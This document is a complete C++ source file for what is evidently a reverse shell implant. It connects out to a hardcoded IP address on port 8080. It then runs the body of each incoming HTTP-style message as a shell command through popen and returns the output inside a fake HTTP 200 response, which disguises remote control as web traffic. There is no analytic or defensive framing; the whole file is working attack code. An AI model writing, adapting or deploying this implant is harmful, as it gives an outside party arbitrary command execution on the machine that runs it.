#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

using namespace std;

string executeCommand(const string& command) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return "popen failed!";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

int main() {
    int sock = 0;
    struct sockaddr_in serverAddr;
    char buffer[4096];

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        cerr << "Socket creation failed." << endl;
        return 1;
    }

    // Setup server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    if (inet_pton(AF_INET, "100.64.132.104", &serverAddr.sin_addr) <= 0) {
        cerr << "Invalid address/ Address not supported." << endl;
        close(sock);
        return 1;
    }

    // Connect to server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        cerr << "Failed to connect to server." << endl;
        close(sock);
        return 1;
    }

    while (true) {
        // Receive HTTP request
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            cout << "Connection closed or error." << endl;
            break;
        }

        buffer[bytesReceived] = '\0';
        string request(buffer);

        // Parse HTTP request
        size_t bodyPos = request.find("\r\n\r\n");
        if (bodyPos == string::npos) {
            cout << "Invalid HTTP request." << endl;
            continue;
        }

        string command = request.substr(bodyPos + 4);
        cout << "Command received: " << command << endl;

        // Execute command
        string result = executeCommand(command);

        // Send HTTP response
        ostringstream response;
        response << "HTTP/1.1 200 OK\r\nContent-Length: " << result.size() << "\r\n\r\n" << result;
        send(sock, response.str().c_str(), response.str().size(), 0);
    }

    // Cleanup
    close(sock);
    return 0;
}
